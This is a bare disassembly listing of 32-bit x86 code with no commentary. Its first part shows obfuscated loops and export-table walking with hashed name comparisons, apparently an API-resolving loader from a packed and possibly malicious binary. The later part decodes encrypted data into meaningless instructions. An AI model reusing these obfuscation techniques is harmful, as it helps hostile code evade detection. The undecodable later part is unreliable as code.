  40605c:	mov    DWORD PTR [ebp-0x18],eax
  40605f:	mov    eax,DWORD PTR [ebp-0x4]
  406062:	mov    DWORD PTR ds:0x42c00c,0x1d
  40606c:	cmp    DWORD PTR ds:0x42c00c,0x0
  406073:	je     0x4060a7
  406079:	cmp    DWORD PTR ds:0x42c00c,0x21
  406080:	jne    0x40608f
  406086:	push   DWORD PTR [ebp-0xc]
  406089:	call   DWORD PTR ds:0x42401c
  40608f:	mov    edi,DWORD PTR ds:0x42c00c
  406095:	dec    edi
  406096:	mov    DWORD PTR ds:0x42c00c,edi
  40609c:	jmp    0x40606c
  4060a1:	adc    ecx,DWORD PTR ds:0x428008
  4060a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4060aa:	and    DWORD PTR ds:0x42b01c,0x0
  4060b4:	mov    edi,DWORD PTR ds:0x42b01c
  4060ba:	inc    edi
  4060bb:	mov    DWORD PTR ds:0x42b01c,edi
  4060c1:	cmp    DWORD PTR ds:0x42b01c,0x23
  4060c8:	jne    0x4060da
  4060ce:	push   DWORD PTR [ebp-0x14]
  4060d1:	push   DWORD PTR [ebp-0x28]
  4060d4:	call   DWORD PTR ds:0x424020
  4060da:	cmp    DWORD PTR ds:0x42b01c,0x19
  4060e1:	jb     0x4060b4
  4060e7:	xor    eax,ebx
  4060e9:	add    DWORD PTR ds:0x429018,0x397c
  4060f3:	mov    edi,0x3272db
  4060f8:	sub    DWORD PTR ds:0x428020,0x386b
  406102:	add    eax,edi
  406104:	mov    DWORD PTR ds:0x42900c,0x67dc
  40610e:	cmp    ecx,eax
  406110:	mov    DWORD PTR ds:0x42c00c,0x661b
  40611a:	je     0x406313
  406120:	push   DWORD PTR [ebp-0x18]
  406123:	sub    DWORD PTR ds:0x42800c,0x42a014
  40612d:	push   DWORD PTR [ebp+0x8]
  406130:	and    DWORD PTR ds:0x42b000,0x429010
  40613a:	call   0x41b72b
  40613f:	sub    ecx,DWORD PTR ds:0x42a00c
  406145:	mov    DWORD PTR [ebp-0x18],eax
  406148:	xor    eax,eax
  40614a:	xor    eax,DWORD PTR ds:0x42a01c
  406150:	xor    DWORD PTR ds:0x428018,eax
  406156:	mov    eax,DWORD PTR [ebp-0x4]
  406159:	mov    ecx,DWORD PTR [ebp-0x18]
  40615c:	xor    eax,ebx
  40615e:	add    eax,edi
  406160:	cmp    ecx,eax
  406162:	je     0x406313
  406168:	mov    ecx,DWORD PTR ds:0x429010
  40616e:	add    DWORD PTR ds:0x42a010,ecx
  406174:	mov    eax,DWORD PTR [ebp-0x18]
  406177:	and    DWORD PTR ds:0x42a008,0x0
  406181:	jmp    0x406193
  406186:	mov    ecx,DWORD PTR ds:0x42a008
  40618c:	inc    ecx
  40618d:	mov    DWORD PTR ds:0x42a008,ecx
  406193:	cmp    DWORD PTR ds:0x42a008,0x14
  40619a:	jae    0x40621e
  4061a0:	cmp    DWORD PTR ds:0x42a008,0x1f
  4061a7:	jne    0x4061d5
  4061ad:	push   0x42b010
  4061b2:	push   DWORD PTR [ebp-0x10]
  4061b5:	push   0x4f72
  4061ba:	push   0x42900c
  4061bf:	push   DWORD PTR [ebp-0x24]
  4061c2:	push   0x423992
  4061c7:	push   DWORD PTR [ebp-0x1c]
  4061ca:	push   0x3544
  4061cf:	call   DWORD PTR ds:0x424024
  4061d5:	jmp    0x406186
  4061da:	and    DWORD PTR ds:0x428020,0x0
  4061e4:	mov    ecx,DWORD PTR ds:0x428020
  4061ea:	inc    ecx
  4061eb:	mov    DWORD PTR ds:0x428020,ecx
  4061f1:	cmp    DWORD PTR ds:0x428020,0x1a
  4061f8:	jne    0x406211
  4061fe:	push   DWORD PTR [ebp-0x1c]
  406201:	push   0x561b
  406206:	push   0x3276
  40620b:	call   DWORD PTR ds:0x424028
  406211:	cmp    DWORD PTR ds:0x428020,0x17
  406218:	jb     0x4061e4
  40621e:	mov    eax,DWORD PTR [eax+0x18]
  406221:	mov    DWORD PTR [ebp-0x24],eax
  406224:	xor    eax,eax
  406226:	mov    eax,DWORD PTR [ebp-0x18]
  406229:	mov    ecx,DWORD PTR [ebp+0x8]
  40622c:	add    DWORD PTR ds:0x42901c,0x480
  406236:	add    ecx,DWORD PTR [eax+0x20]
  406239:	mov    DWORD PTR [ebp-0x2c],ecx
  40623c:	sub    DWORD PTR ds:0x42c00c,ebx
  406242:	mov    eax,DWORD PTR [ebp-0x18]
  406245:	mov    ecx,DWORD PTR [ebp+0x8]
  406248:	add    DWORD PTR ds:0x42a004,0x42a01c
  406252:	add    ecx,DWORD PTR [eax+0x24]
  406255:	mov    DWORD PTR [ebp-0x34],ecx
  406258:	inc    ecx
  406259:	mov    eax,DWORD PTR [ebp-0x18]
  40625c:	sub    DWORD PTR ds:0x42b010,0x20b8
  406266:	mov    ecx,DWORD PTR [ebp+0x8]
  406269:	or     DWORD PTR ds:0x42a010,0x1874
  406273:	add    ecx,DWORD PTR [eax+0x1c]
  406276:	mov    eax,edi
  406278:	mov    DWORD PTR [ebp-0x18],ecx
  40627b:	jmp    0x4062db
  406280:	mov    ecx,DWORD PTR [ebp-0x2c]
  406283:	mov    edx,DWORD PTR [ebp+0x8]
  406286:	add    edx,DWORD PTR [ecx+esi*4]
  406289:	mov    DWORD PTR [ebp-0x28],edx
  40628c:	mov    ecx,DWORD PTR [ebp-0x4]
  40628f:	mov    edx,DWORD PTR [ebp-0x28]
  406292:	xor    ecx,ebx
  406294:	add    ecx,eax
  406296:	cmp    edx,ecx
  406298:	je     0x4062db
  40629e:	jmp    0x4062c7
  4062a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4062a6:	mov    edx,DWORD PTR [ebp-0x8]
  4062a9:	xor    ecx,ebx
  4062ab:	add    ecx,eax
  4062ad:	cmp    edx,ecx
  4062af:	je     0x40631f
  4062b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4062b8:	mov    edx,DWORD PTR [ebp-0x30]
  4062bb:	xor    ecx,ebx
  4062bd:	add    ecx,eax
  4062bf:	cmp    edx,ecx
  4062c1:	je     0x40632e
  4062c7:	lea    eax,[ebp-0x8]
  4062ca:	push   eax
  4062cb:	push   DWORD PTR [ebp-0x28]
  4062ce:	push   DWORD PTR [ebp+0xc]
  4062d1:	call   0x41c3b5
  4062d6:	mov    eax,0x3272db
  4062db:	mov    ecx,DWORD PTR [ebp-0x4]
  4062de:	mov    edx,DWORD PTR [ebp-0x8]
  4062e1:	xor    ecx,ebx
  4062e3:	add    ecx,eax
  4062e5:	cmp    edx,ecx
  4062e7:	je     0x406302
  4062ed:	mov    ecx,DWORD PTR [ebp-0x34]
  4062f0:	movzx  ecx,WORD PTR [ecx+esi*2]
  4062f4:	mov    edx,DWORD PTR [ebp-0x18]
  4062f7:	mov    ecx,DWORD PTR [edx+ecx*4]
  4062fa:	mov    DWORD PTR [ebp-0x38],ecx
  4062fd:	jmp    0x4062a3
  406302:	mov    ecx,DWORD PTR [ebp-0x14]
  406305:	xor    ecx,ebx
  406307:	lea    esi,[esi+ecx*1+0x3272db]
  40630e:	jmp    0x405fec
  406313:	mov    eax,DWORD PTR [ebp-0x4]
  406316:	xor    eax,ebx
  406318:	add    eax,edi
  40631a:	jmp    0x40cf3f
  40631f:	mov    eax,DWORD PTR [ebp-0x4]
  406322:	xor    eax,ebx
  406324:	add    eax,0x3272db
  406329:	jmp    0x40cf3f
  40632e:	mov    ecx,DWORD PTR [ebp-0x38]
  406331:	add    ecx,DWORD PTR [ebp+0x8]
  406334:	mov    DWORD PTR [ebp-0x10],ecx
  406337:	mov    ecx,DWORD PTR [ebp-0x1c]
  40633a:	test   ecx,ecx
  40633c:	je     0x40ceca
  406342:	mov    DWORD PTR [ebp-0x20],0x0
  406349:	jmp    0x4086d8
  40634e:	ins    BYTE PTR es:[edi],dx
  40634f:	pop    ebp
  406350:	(bad)  
  406351:	call   0xd5a4cae1
  406356:	xchg   esi,eax
  406357:	imul   esi,edx,0x66
  40635a:	sub    bh,BYTE PTR [edi+0x1]
  40635d:	inc    esp
  40635e:	cmp    BYTE PTR [ebx],bh
  406360:	bound  esp,QWORD PTR [edx+0x10]
  406363:	pop    edi
  406364:	bound  esp,QWORD PTR [edx+0x51]
  406367:	sbb    ebx,ecx
  406369:	loop   0x40630a
  40636b:	loop   0x406398
  40636d:	test   DWORD PTR [ebp+0x76],0x87d47ba
  406374:	out    dx,eax
  406375:	imul   al
  406377:	push   cs
  406378:	push   ebp
  406379:	fisub  WORD PTR [edi+0x54791062]
  40637f:	rol    BYTE PTR ds:0x6eeaef47,1
  406385:	test   al,0x6d
  406387:	nop
  406388:	or     eax,0x38eaae80
  40638d:	xchg   ebx,eax
  40638e:	cmp    BYTE PTR ds:0xf5d150ee,bh
  406394:	repz mov edi,0xbd12406
  40639a:	sbb    DWORD PTR [ecx-0x71],ecx
  40639d:	inc    ebx
  40639e:	ror    DWORD PTR [edx-0x6e57bdfe],1
  4063a4:	call   0x95cb:0xa8722932
  4063ab:	jb     0x4063e0
  4063ad:	loop   0x406380
  4063af:	dec    esp
  4063b0:	lea    ebx,[edx-0x59701b2d]
  4063b6:	sub    al,0xe
  4063b8:	sub    edi,DWORD PTR [esi-0x453fdf23]
  4063be:	adc    BYTE PTR [edx+0x4a],dl
  4063c1:	not    DWORD PTR [ebp-0x77abdda3]
  4063c7:	int    0xae
  4063c9:	into   
  4063ca:	cmp    DWORD PTR [edx],esp
  4063cc:	jg     0x4063f0
  4063ce:	mov    BYTE PTR [esi+0x62504f0b],cl
  4063d4:	aaa    
  4063d5:	and    al,0x66
  4063d7:	inc    ecx
  4063d8:	arpl   WORD PTR [ebx+0x29db12dc],sp
  4063de:	cs push esp
  4063e0:	dec    edx
  4063e1:	and    DWORD PTR [esi+0x1e33d01f],eax
  4063e7:	call   0x1600:0x69126f15
  4063ee:	pop    edi
  4063ef:	arpl   WORD PTR [ebx],cx
  4063f1:	or     eax,0xe3eac9e7
  4063f6:	sbb    al,0x1e
  4063f8:	inc    ecx
  4063f9:	icebp  
  4063fa:	sbb    ebp,DWORD PTR [esi+ebp*2]
  4063fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063fe:	ss popf 
  406400:	(bad)  
  406401:	scas   eax,DWORD PTR es:[edi]
  406402:	(bad)  
  406405:	cmp    eax,0xb89d1313
  40640a:	mov    al,ds:0x2ea2685a
  40640f:	xchg   DWORD PTR [ebx+ebx*8-0x8846241],eax
  406416:	ss add eax,0x7957c39a
  40641c:	dec    ebp
  40641d:	push   edx
  40641e:	xor    BYTE PTR [ebp+0x4c],dh
  406421:	inc    eax
  406422:	cmp    ebp,DWORD PTR ds:0xae95e356
  406428:	jg     0x406461
  40642a:	ins    BYTE PTR es:[edi],dx
  40642b:	and    BYTE PTR [edx],ch
  40642d:	inc    ebx
  40642e:	mov    ch,0x23
  406430:	lea    esp,[ecx-0x3c67c20e]
  406436:	dec    edi
  406437:	ja     0x406424
  406439:	xlat   BYTE PTR ds:[ebx]
  40643a:	and    eax,0xa9f05fec
  40643f:	pushf  
  406440:	xchg   esp,eax
  406441:	adc    DWORD PTR [ecx-0x33],ecx
  406444:	mov    WORD PTR ds:[eax-0x7b],es
  406448:	jbe    0x4064be
  40644a:	mov    edx,0x2a8a7142
  40644f:	or     dh,BYTE PTR [eax+ecx*1]
  406452:	std    
  406453:	cmc    
  406454:	cmp    BYTE PTR [ebp+0x4b],al
  406457:	push   0xffffffb1
  406459:	adc    eax,0xc8936287
  40645e:	in     eax,dx
  40645f:	ins    DWORD PTR es:[edi],dx
  406460:	stos   DWORD PTR es:[edi],eax
  406461:	stos   DWORD PTR es:[edi],eax
  406462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406463:	sbb    al,0xed
  406465:	sub    edx,DWORD PTR ds:0xed71fa1a
  40646b:	pushf  
  40646c:	jbe    0x4064cf
  40646e:	pop    esi
  40646f:	dec    edi
  406470:	and    bl,BYTE PTR [ecx-0x3b]
  406473:	outs   dx,DWORD PTR ds:[esi]
  406474:	jbe    0x406435
  406476:	push   es
  406477:	call   0xade9e959
  40647c:	ror    esp,cl
  40647e:	mov    ebx,0xd6b7982c
  406483:	out    0xf8,al
  406485:	pushf  
  406486:	dec    ecx
  406487:	clc    
  406488:	or     DWORD PTR [esi-0x43],edx
  40648b:	and    DWORD PTR [esp+ebx*4],0xb48e4c97
  406492:	jmp    FWORD PTR [ebx-0x600e48b2]
  406498:	adc    al,0x95
  40649a:	sub    dh,cl
  40649c:	mov    ah,0x56
  40649e:	sub    al,0x94
  4064a0:	scas   eax,DWORD PTR es:[edi]
  4064a1:	inc    ecx
  4064a2:	dec    edi
  4064a3:	sub    BYTE PTR [bp+di+0x17],0x82
  4064a8:	call   0xf98b1d38
  4064ad:	je     0x4064a0
  4064af:	mov    al,0x8
  4064b1:	aaa    
  4064b2:	push   ebp
  4064b3:	mov    eax,ds:0x36d87c60
  4064b8:	(bad)  
  4064b9:	ins    BYTE PTR es:[edi],dx
  4064ba:	out    0xc,al
  4064bc:	push   es
  4064bd:	jp     0x406482
  4064bf:	sub    eax,0x90087870
  4064c4:	adc    al,ah
  4064c6:	out    dx,al
  4064c7:	cmovne ecx,DWORD PTR [esi+0x23755abc]
  4064ce:	dec    esi
  4064cf:	stos   DWORD PTR es:[edi],eax
  4064d0:	mov    dh,0x95
  4064d2:	sbb    ebx,DWORD PTR [esi-0x80]
  4064d5:	rcr    DWORD PTR [ecx],cl
  4064d7:	xor    eax,0xa3af1f0c
  4064dc:	xchg   edx,eax
  4064dd:	jbe    0x4064d3
  4064df:	arpl   WORD PTR [eax],cx
  4064e1:	or     eax,0x214b45b5
  4064e6:	sbb    eax,0xa74f4d8d
  4064eb:	pop    esp
  4064ec:	add    BYTE PTR [ecx-0x41426ffd],0x2
  4064f3:	mov    ebx,ss
  4064f5:	cs test eax,0x57a5197e
  4064fb:	ficom  WORD PTR [edi]
  4064fd:	(bad)  
  4064fe:	and    eax,0x9767f930
  406503:	sbb    bh,BYTE PTR [ebx+0x4b]
  406506:	xor    al,0x51
  406508:	sub    ch,BYTE PTR [edx+0x7dfdd5a]
  40650e:	hlt    
  40650f:	test   DWORD PTR [ecx-0x29aa8b2a],edi
  406515:	push   ds
  406516:	sbb    al,0x13
  406518:	shr    DWORD PTR [ecx-0x31],1
  40651b:	loopne 0x406548
  40651d:	push   ebp
  40651e:	adc    al,0xba
  406520:	pop    ds
  406521:	and    dh,BYTE PTR [ebx+0x98d5396]
  406527:	mov    dh,0x49
  406529:	jno    0x4064ea
  40652b:	jp     0x406568
  40652d:	aaa    
  40652e:	(bad)  
  40652f:	inc    DWORD PTR [eax-0x17282267]
  406535:	(bad)  
  406536:	mov    al,ds:0xd0149f03
  40653b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40653c:	pop    esp
  40653d:	cmp    ebp,DWORD PTR [edi+edi*4]
  406540:	pop    ebp
  406541:	iret   
  406542:	hlt    
  406543:	das    
  406544:	fdivr  st,st(6)
  406546:	push   edx
  406547:	or     al,0x5c
  40654a:	adc    bl,BYTE PTR [edi]
  40654c:	pop    esp
  40654d:	jns    0x40651a
  40654f:	nop
  406550:	dec    edi
  406551:	sub    eax,0x954335ff
  406556:	sahf   
  406557:	xor    DWORD PTR [edi],edi
  406559:	push   cs
  40655a:	dec    esi
  40655b:	(bad)  
  40655c:	add    DWORD PTR [ebx],0xad2c64c6
  406562:	pop    ebp
  406563:	jo     0x406586
  406565:	dec    ebp
  406566:	repz (bad) 
  406568:	dec    edi
  406569:	adc    edx,DWORD PTR [esi]
  40656b:	int3   
  40656c:	rcr    BYTE PTR [edx],0x48
  40656f:	jb     0x4065d0
  406571:	mov    ah,0x0
  406573:	icebp  
  406574:	outs   dx,BYTE PTR ds:[esi]
  406575:	jno    0x40658b
  406577:	outs   dx,BYTE PTR ds:[esi]
  406578:	psubsw mm3,QWORD PTR [eax+ebx*2-0x29a5f7f]
  406580:	lods   eax,DWORD PTR ds:[esi]
  406581:	test   al,0xda
  406583:	mov    dh,0xf0
  406585:	xchg   edx,eax
  406586:	mov    ebp,ebp
  406588:	mov    ds:0x458db8d4,al
  40658d:	mov    ch,0x31
  40658f:	sahf   
  406590:	sbb    eax,0xe267b7ba
  406595:	and    esi,ecx
  406597:	jl     0x4065f9
  406599:	lahf   
  40659a:	retf   
  40659b:	pop    es
  40659c:	cmp    al,0xba
  40659e:	cdq    
  40659f:	outs   dx,BYTE PTR ds:[esi]
  4065a0:	pop    ecx
  4065a1:	or     eax,0x8ca53d94
  4065a6:	cs push ds
  4065a8:	mov    ecx,0x2cc4a560
  4065ad:	mov    bl,0x15
  4065af:	mov    ch,0x8
  4065b1:	xchg   edx,eax
  4065b2:	fsubr  QWORD PTR [esi-0x55]
  4065b5:	fistp  DWORD PTR [ecx-0x15]
  4065b8:	mov    eax,0x5b891dbf
  4065bd:	add    ebp,esp
  4065bf:	or     BYTE PTR [edx],bh
  4065c1:	daa    
  4065c2:	inc    ebp
  4065c3:	dec    esi
  4065c4:	and    dh,0x3a
  4065c7:	xor    BYTE PTR ds:0x9cf4cd7a,bl
  4065cd:	shr    BYTE PTR [ecx-0x76],0xc3
  4065d1:	adc    DWORD PTR [ebp-0x74],0x14059e2c
  4065d8:	jne    0x4065ee
  4065da:	ret    0x47cc
  4065dd:	mov    eax,0x4da55e17
  4065e2:	cmp    DWORD PTR [esi-0xa],esp
  4065e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065e6:	mov    dh,0x9b
  4065e8:	es mov ebp,0x51bd1961
  4065ee:	dec    ecx
  4065ef:	sub    DWORD PTR [edi],esp
  4065f1:	mov    ecx,0x8e1f4fe7
  4065f6:	inc    ebx
  4065f7:	icebp  
  4065f8:	lods   al,BYTE PTR ds:[esi]
  4065f9:	mov    al,ds:0xbd9891d1
  4065fe:	sbb    al,0x87
  406600:	cs push es
  406602:	popf   
  406603:	or     DWORD PTR ds:0x296ec8c8,eax
  406609:	int3   
  40660a:	ja     0x4065d2
  40660c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40660d:	loop   0x406609
  40660f:	test   DWORD PTR [edx+0x49],eax
  406612:	cmp    ah,0x22
  406615:	jno    0x40668a
  406617:	cwde   
  406618:	inc    esp
  406619:	jmp    0x4065d1
  40661b:	scas   al,BYTE PTR es:[edi]
  40661c:	push   cs
  40661d:	mov    dl,0x74
  40661f:	mov    ecx,0xf1c87f66
  406624:	out    dx,al
  406625:	xchg   ebx,eax
  406626:	cmp    esi,edx
  406628:	scas   al,BYTE PTR es:[edi]
  406629:	cmp    al,0x52
  40662b:	cwde   
  40662c:	cmp    dl,BYTE PTR [eax-0x78653ab8]
  406632:	inc    eax
  406633:	and    eax,0x94070373
  406638:	xchg   DWORD PTR [ebx-0x48],ecx
  40663b:	lahf   
  40663c:	test   BYTE PTR [edi-0x2a76e910],ah
  406642:	add    DWORD PTR [esi+0x62],0xffffffe5
  406646:	je     0x4065df
  406648:	stc    
  406649:	enter  0xc5c9,0xdb
  40664d:	int    0xc3
  40664f:	jns    0x406611
  406651:	mov    ebp,0x47553e22
  406656:	and    eax,0x2400e7d7
  40665b:	pop    ecx
  40665c:	xlat   BYTE PTR ds:[ebx]
  40665d:	ret    
  40665e:	pop    edi
  40665f:	in     eax,0x93
  406661:	adc    DWORD PTR [edx],esi
  406663:	out    0xa8,eax
  406665:	in     eax,0x9e
  406667:	and    esp,DWORD PTR es:[esi+0x6e]
  40666b:	enter  0x51e8,0xb
  40666f:	pop    esi
  406670:	push   0xfffffff8
  406672:	retf   
  406673:	pushf  
  406674:	jne    0x406661
  406676:	mov    ds:0x189700de,eax
  40667b:	in     al,0x5d
  40667d:	ret    0x1f85
  406680:	pop    esp
  406681:	push   ebp
  406682:	or     DWORD PTR [eax],eax
  406684:	xor    WORD PTR [eax],cx
  406687:	push   ecx
  406688:	adc    edi,DWORD PTR [esi-0x3cd09fe2]
  40668e:	sar    DWORD PTR [esi],cl
  406690:	mov    esi,ebp
  406692:	pop    ss
  406693:	sti    
  406694:	test   al,0x12
  406696:	and    ch,BYTE PTR [ebp-0x443a79ab]
  40669c:	ror    BYTE PTR [edi-0xc66e6cd],cl
  4066a2:	mov    edx,0x830ac947
  4066a7:	jmp    0x406649
  4066a9:	repz fdivr st(4),st
  4066ac:	bound  edi,QWORD PTR [eax+0x531fa33f]
  4066b2:	sbb    al,0xa4
  4066b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066b5:	neg    DWORD PTR [edi-0x38a7c989]
  4066bb:	nop
  4066bc:	js     0x4066d4
  4066be:	cmp    esp,DWORD PTR [ebp+0x76]
  4066c1:	adc    eax,0xcb723bdc
  4066c6:	enter  0xb08f,0x3
  4066ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066cb:	loop   0x40667d
  4066cd:	mov    esp,0xb55d9a94
  4066d2:	sahf   
  4066d3:	(bad)  
  4066d4:	jl     0x40674a
  4066d6:	mov    cl,0x7e
  4066d8:	jge    0x40665a
  4066da:	pop    eax
  4066db:	xchg   edx,eax
  4066dc:	pop    ds
  4066dd:	sub    edi,esp
  4066df:	cdq    
  4066e0:	jg     0x4066da
  4066e2:	pop    edi
  4066e3:	jnp    0x4066c4
  4066e5:	push   ebp
  4066e6:	add    al,bh
  4066e8:	jb     0x4066a3
  4066ea:	push   edi
  4066eb:	jg     0x40671a
  4066ed:	push   es
  4066ee:	adc    al,0x4
  4066f0:	dec    ecx
  4066f1:	hlt    
  4066f2:	mov    eax,0xd1bd0b02
  4066f7:	jb     0x40675b
  4066f9:	jmp    0x55d6e6d4
  4066fe:	stos   BYTE PTR es:[edi],al
  4066ff:	add    DWORD PTR [edx],esp
  406701:	out    0x72,eax
  406703:	bound  edx,QWORD PTR [esi+0x7]
  406706:	jge    0x4066f6
  406708:	pusha  
  406709:	adc    DWORD PTR [edi],esi
  40670b:	adc    al,al
  40670d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40670e:	pop    ds
  40670f:	ja     0x4066a9
  406711:	jmp    DWORD PTR [esi-0x2357f6e9]
  406717:	(bad)  
  406718:	fst    QWORD PTR [ebp+0x63]
  40671b:	push   edi
  40671c:	outs   dx,DWORD PTR ds:[esi]
  40671d:	xchg   edx,eax
  40671e:	jo     0x4066ca
  406720:	nop
  406721:	test   BYTE PTR [ebp-0x48],bh
  406724:	jbe    0x4066c6
  406726:	add    cl,ah
  406728:	cmc    
  406729:	lahf   
  40672a:	cmp    ch,bh
  40672c:	cmp    al,0x2a
  40672e:	sbb    DWORD PTR [edi+0x5b],ebp
  406731:	int3   
  406732:	mov    ?,WORD PTR [edi-0x3a]
  406735:	(bad)  
  406736:	loopne 0x4067a4
  406738:	mov    gs,ebx
  40673a:	ins    DWORD PTR es:[edi],dx
  40673b:	loope  0x4067aa
  40673d:	nop
  40673e:	cdq    
  40673f:	xchg   esi,eax
  406740:	leave  
  406741:	xchg   esp,eax
  406742:	into   
  406743:	push   edi
  406744:	(bad)
  406747:	dec    ebx
  406748:	mov    ds:0xb59de236,eax
  40674d:	int    0x74
  40674f:	in     eax,dx
  406750:	xor    BYTE PTR [esi],dl
  406752:	cmp    BYTE PTR [ebx-0x3ab4085d],dl
  406758:	inc    ecx
  406759:	mov    esi,0x8571b5ef
  40675e:	sbb    edi,DWORD PTR [eax]
  406760:	pop    edi
  406761:	or     al,0x70
  406763:	jmp    0x4067ae
  406765:	add    al,0xa8
  406767:	sar    BYTE PTR [edi+0x9],cl
  40676a:	in     eax,0x96
  40676c:	in     al,dx
  40676d:	adc    eax,0xa6f65e1b
  406772:	pop    eax
  406773:	dec    edi
  406774:	not    al
  406776:	aad    0x6
  406778:	sbb    BYTE PTR ds:0xfc13cbfc,al
  40677e:	adc    al,0x2c
  406780:	out    dx,eax
  406781:	cmp    BYTE PTR [edx+edx*4],bh
  406784:	fmul   DWORD PTR [ebp-0x30e4d4fd]
  40678a:	(bad)  [edi+0x39]
  40678d:	mov    ah,0xa5
  40678f:	mov    dh,0xc4
  406791:	xor    BYTE PTR [eax],0xb5
  406794:	mov    bl,BYTE PTR [ecx]
  406796:	scas   al,BYTE PTR es:[edi]
  406797:	test   eax,0x10378797
  40679c:	fmul   QWORD PTR [ebx]
  40679e:	mov    edx,0x7f1e121f
  4067a3:	loope  0x4067e9
  4067a5:	add    eax,0x5149d86a
  4067aa:	shr    bl,0x8f
  4067ad:	ins    BYTE PTR es:[edi],dx
  4067ae:	sbb    dl,BYTE PTR [edx+eiz*8+0x62144b8c]
  4067b5:	xor    eax,0xfe69f731
  4067ba:	xor    edx,ebx
  4067bc:	adc    ebp,ebx
  4067be:	mov    ds:0xd3599cb4,al
  4067c3:	in     al,0x3d
  4067c5:	jne    0x4067a8
  4067c7:	jmp    0xb79baa8e
  4067cc:	jnp    0x4067db
  4067ce:	mov    ah,0x83
  4067d0:	inc    ebp
  4067d1:	loope  0x406814
  4067d3:	cli    
  4067d4:	dec    ebx
  4067d5:	jb     0x406802
  4067d7:	xor    eax,0x9541bfff
  4067dc:	mov    ds:0x9df67cda,al
  4067e1:	mov    esi,0xa72e23e7
  4067e6:	rep ins BYTE PTR es:[edi],dx
  4067e8:	shl    DWORD PTR [esi+0x5b12ed45],0xeb
  4067ef:	ja     0x406801
  4067f1:	pop    ebx
  4067f2:	(bad)
  4067f5:	mov    ebx,0x81e65fb5
  4067fa:	out    dx,eax
  4067fb:	enter  0x73cb,0xc2
  4067ff:	loop   0x4067cd
  406801:	push   edx
  406802:	push   edi
  406803:	xor    esi,DWORD PTR [ecx+0x7f1c09c3]
  406809:	cld    
  40680a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40680b:	test   BYTE PTR [ecx+0x2801759a],al
  406811:	sahf   
  406812:	aaa    
  406813:	mov    cl,0x26
  406815:	fcmovbe st,st(0)
  406817:	(bad)  
  406818:	inc    ebx
  406819:	xchg   BYTE PTR [edx],bh
  40681b:	xor    BYTE PTR [ebp-0x4c72b24e],al
  406821:	or     al,0xe4
  406823:	lds    ecx,FWORD PTR [esp+ecx*1]
  406826:	fistp  QWORD PTR [ebx+0x16476f03]
  40682c:	fld    QWORD PTR [ebp+0x12]
  40682f:	xor    esp,ebp
  406831:	sbb    ah,BYTE PTR [ebp-0x7e]
  406834:	stos   DWORD PTR es:[edi],eax
  406835:	sub    DWORD PTR [edi+0x25],edx
  406838:	jp     0x40681e
  40683a:	sbb    bh,BYTE PTR [esi]
  40683c:	das    
  40683d:	lods   eax,DWORD PTR ds:[esi]
  40683e:	mov    ebx,0x305dbc5c
  406843:	xchg   ebp,eax
  406844:	dec    esi
  406845:	neg    DWORD PTR [esi-0x3b]
  406848:	cmp    dh,bl
  40684a:	scas   al,BYTE PTR es:[edi]
  40684b:	add    eax,0xdcbd2469
  406850:	push   eax
  406851:	add    eax,0x53305aa8
  406856:	add    eax,0xf97d4845
  40685b:	adc    cl,BYTE PTR [edi+0x373c87a6]
  406861:	mov    esi,0x62f67ba6
  406866:	xchg   edx,eax
  406867:	rcl    DWORD PTR [esi],cl
  406869:	aam    0xc1
  40686b:	jge    0x4068c2
  40686d:	aaa    
  40686e:	dec    eax
  40686f:	cdq    
  406870:	push   cs
  406871:	sub    edi,edx
  406873:	xor    DWORD PTR [ebx],esp
  406875:	jl     0x4068c2
  406877:	push   ebp
  406878:	push   es
  406879:	fdiv   QWORD PTR [ebx]
  40687b:	sbb    DWORD PTR [ecx-0x4e],ecx
  40687e:	dec    eax
  40687f:	adc    bh,BYTE PTR ds:0x24fb02c9
  406885:	(bad)  
  406886:	mov    eax,0xcd32a148
  40688b:	das    
  40688c:	push   ss
  40688d:	sbb    DWORD PTR [esi],esi
  40688f:	or     eax,0xd881cba6
  406894:	mov    ds:0x9780ce50,al
  406899:	mov    ecx,0xb4329dd9
  40689e:	test   eax,0x8f3ec68e
  4068a3:	ret    0x5459
  4068a6:	pop    edx
  4068a7:	out    0xe7,al
  4068a9:	adc    al,BYTE PTR ds:0x89473cfd
  4068af:	cmp    al,0x19
  4068b1:	pop    edx
  4068b2:	(bad)  
  4068b3:	fnstcw WORD PTR [esi]
  4068b5:	ss test al,0x95
  4068b8:	std    
  4068b9:	inc    ecx
  4068ba:	mov    ah,0xbd
  4068bc:	out    0x9e,eax
  4068be:	iret   
  4068bf:	jae    0x40690f
  4068c1:	test   al,0x8c
  4068c3:	xchg   ecx,eax
  4068c4:	and    ch,ch
  4068c6:	in     eax,dx
  4068c7:	mov    esi,0xf25086be
  4068cc:	mov    ebx,0xb28194ca
  4068d1:	test   edx,esp
  4068d3:	xor    al,0xe8
  4068d5:	mov    eax,0xadbd5d4f
  4068da:	xchg   BYTE PTR [edx+0x1],cl
  4068dd:	mov    al,0x1a
  4068df:	mov    esi,0x8cbb9a0c
  4068e4:	mov    eax,ds:0x4113df78
  4068e9:	add    al,0x85
  4068eb:	or     DWORD PTR [ebx],esp
  4068ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068ee:	push   esp
  4068ef:	xor    ecx,DWORD PTR [ecx]
  4068f1:	cmp    DWORD PTR [edx-0x1f43ace5],ebx
  4068f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068f8:	scas   eax,DWORD PTR es:[edi]
  4068f9:	(bad)  
  4068fa:	lods   eax,DWORD PTR ds:[esi]
  4068fb:	iret   
  4068fc:	out    0x66,eax
  4068fe:	and    al,0x77
  406900:	pop    ss
  406901:	add    al,0xa4
  406903:	sbb    BYTE PTR [ecx-0x2a],0x6e
  406907:	adc    ebx,DWORD PTR [ebx-0x4cb315c9]
  40690d:	xor    ah,BYTE PTR ds:0x61ebdf7d
  406913:	jg     0x40689c
